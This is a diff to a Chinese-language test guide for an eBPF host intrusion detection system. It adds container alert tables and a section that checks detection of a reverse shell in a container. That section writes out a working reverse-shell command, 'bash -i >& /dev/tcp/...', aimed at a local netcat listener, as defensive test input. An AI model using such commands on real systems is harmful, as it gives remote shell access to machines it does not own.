@@ -62,6 +62,8 @@ Agent                          hcids Server                    PostgreSQL
 | nids | 6007 | alert_network_attack | INSERT | |
 | ebpf_base_detector | 6008 | alert_malicious_request | INSERT |
 | ebpf_base_detector | 6009 | alert_file_integrity | INSERT |
+| ebpf_base_detector | 7001 | alert_container_dangerous_command | INSERT | |
+| ebpf_base_detector | 7003 | alert_container_reverse_shell | INSERT | |
 | vuln (hcids) | - | vuln_info | UPSERT | 漏洞信息，由 hcids 漏洞模块自动写入 |
 | vuln (hcids) | - | host_vuln_scan_task | INSERT | 主机漏洞扫描任务，由 hcids 漏洞模块自动写入 |
 | vuln (hcids) | - | host_vuln_detail | INSERT | 主机漏洞详情，由 hcids 漏洞模块自动写入 |
@@ -86,6 +88,7 @@ Agent                          hcids Server                    PostgreSQL
 |------|------|---------|---------|
 | Nginx/httpd | Web 服务采集 + NIDS 网络攻击检测 | `apt install nginx` 或 `yum install httpd` | `systemctl is-active nginx` |
 | Docker | 容器/镜像资产采集 | `apt install docker.io` | `docker info` |
+| nc (netcat) | 反弹 Shell + 容器反弹 Shell 测试 | `apt install netcat-openbsd` | `which nc` |
 | sshpass | SSH 暴力破解测试 | `apt install sshpass` | `which sshpass` |
 | ClamAV | Scanner 恶意文件扫描 | `apt install clamav libclamav-dev` | `which clamscan` |
 | DNS 解析 | 恶意请求检测 | - | `dig +short example.com` |
@@ -181,7 +184,8 @@ TRUNCATE TABLE event_execve, event_connect, event_dns, event_file CASCADE;
 -- 清空告警表
 TRUNCATE TABLE alert_brute_force, alert_dangerous_command, alert_privilege_escalation,
     alert_reverse_shell, alert_abnormal_login, alert_malicious_request,
-    alert_malware_scan, alert_network_attack, alert_file_integrity CASCADE;
+    alert_malware_scan, alert_network_attack, alert_file_integrity,
+    alert_container_dangerous_command, alert_container_reverse_shell CASCADE;
 
 -- 清空 Baseline 表
 TRUNCATE TABLE baseline_check_detail, baseline_check_result CASCADE;
@@ -694,6 +698,60 @@ ORDER BY created_at DESC LIMIT 5;
 - `threat_action` 为 `create` 或 `delete`
 - `threat_level` 非空
 - `operator_user` 为执行操作的用户
+
+### 5.6 容器反弹 Shell 检测 (DataType 7003)
+
+eBPF 监控容器内进程的 stdin/stdout 是否连接到网络 socket，检测容器内的反弹 Shell 行为。与主机反弹 Shell（5.3 节，DataType 6004）原理相同，但针对容器环境，额外采集 container_id、container_name、image_name 等容器上下文字段。
+
+**前提：** 需要有运行中的容器（参见 4.1 容器资产采集准备）。容器内需要有 bash 或其他 shell。
+
+**准备测试容器**（如果按 4.1 步骤启动的是 alpine 容器，alpine 默认无 bash，建议额外启动一个 ubuntu 容器）：
+
+```bash
+# 启动含 bash 的测试容器
+docker run -d --name test-revshell ubuntu:latest sleep 3600
+
+# 验证容器运行
+docker ps | grep test-revshell
+```
+
+**触发容器反弹 Shell**（需要两个终端）：
+
+```bash
+# 终端 D：在宿主机监听端口
+nc -lvp 9998
+
+# 终端 C：在容器内触发反弹 Shell（测试后立即关闭）
+# 172.17.0.1 为 Docker 默认网桥网关，容器可通过此地址访问宿主机
+docker exec test-revshell bash -c "bash -i >& /dev/tcp/172.17.0.1/9998 0>&1"
+```
+
+> **注意：** 容器内需通过 Docker 网桥地址（`172.17.0.1`）访问宿主机的 nc 监听端口。如果 Docker 网桥地址不同，可通过 `docker network inspect bridge | grep Gateway` 查看。
+
+等待 5-10 秒后查询数据库：
+
+```sql
+SELECT agent_id, host_ip, container_id, container_name, image_name,
+       pid, uid, comm, exe_path, shell_type,
+       remote_ip, remote_port, status, event_time
+FROM alert_container_reverse_shell
+WHERE agent_id = '123456'
+ORDER BY created_at DESC LIMIT 5;
+```
+
+验证要点：
+- `container_id` 为 test-revshell 容器的 ID（与 `docker ps --no-trunc` 输出一致）
+- `comm` 为 `bash`（或触发反弹 Shell 的进程名）
+- `shell_type` 为 `bash`（由 `inferShellType` 自动推断）
+- `remote_port` 为 `9998`
+- `remote_ip` 为 Docker 网桥网关地址（如 `172.17.0.1`）
+
+**清理测试容器**：
+
+```bash
+docker rm -f test-revshell 2>/dev/null
+killall nc 2>/dev/null
+```
 
 ---
 
@@ -1499,7 +1557,9 @@ SELECT
     (SELECT COUNT(*) FROM alert_malicious_request WHERE agent_id = '123456') AS malicious_request_count,
     (SELECT COUNT(*) FROM alert_file_integrity WHERE agent_id = '123456') AS file_integrity_count,
     (SELECT COUNT(*) FROM alert_malware_scan WHERE agent_id = '123456') AS malware_scan_count,
-    (SELECT COUNT(*) FROM alert_network_attack WHERE agent_id = '123456') AS network_attack_count;
+    (SELECT COUNT(*) FROM alert_network_attack WHERE agent_id = '123456') AS network_attack_count,
+    (SELECT COUNT(*) FROM alert_container_dangerous_command WHERE agent_id = '123456') AS container_cmd_count,
+    (SELECT COUNT(*) FROM alert_container_reverse_shell WHERE agent_id = '123456') AS container_revshell_count;
 
 -- ========== Baseline 数据 ==========
 SELECT '=== Baseline Summary ===' AS section;
@@ -1544,6 +1604,7 @@ SELECT
 | alert_abnormal_login | > 0 条 | 从非白名单 IP 登录 SSH 后 |
 | alert_malware_scan | > 0 条 | 执行过 EICAR 扫描后 |
 | alert_network_attack | > 0 条 | 执行过攻击模拟请求后 |
+| alert_container_reverse_shell | > 0 条 | 在容器内触发过反弹 Shell 后 |
 
 **Baseline 数据：**
 
@@ -1588,7 +1649,7 @@ rm -f /etc/cron.d/ebpf_test_cron # crontab 测试文件
 rm -f /root/eicar_test.com /root/eicar_1.exe /root/eicar_2.sh  # EICAR 测试文件
 
 # --- 容器测试产物（4.1 中启动的测试容器）---
-docker rm -f test-alpine 2>/dev/null  # 删除测试容器
+docker rm -f test-alpine test-revshell 2>/dev/null  # 删除测试容器
 
 # --- 反弹 Shell 测试残留 ---
 killall nc 2>/dev/null            # 清理 nc 监听进程
@@ -1636,6 +1697,8 @@ DELETE FROM alert_malicious_request WHERE agent_id = '123456';
 DELETE FROM alert_malware_scan WHERE agent_id = '123456';
 DELETE FROM alert_network_attack WHERE agent_id = '123456';
 DELETE FROM alert_file_integrity WHERE agent_id = '123456';
+DELETE FROM alert_container_dangerous_command WHERE agent_id = '123456';
+DELETE FROM alert_container_reverse_shell WHERE agent_id = '123456';
 DELETE FROM baseline_check_detail WHERE agent_id = '123456';
 DELETE FROM baseline_check_result WHERE agent_id = '123456';
 DELETE FROM agent_info WHERE agent_id = '123456';
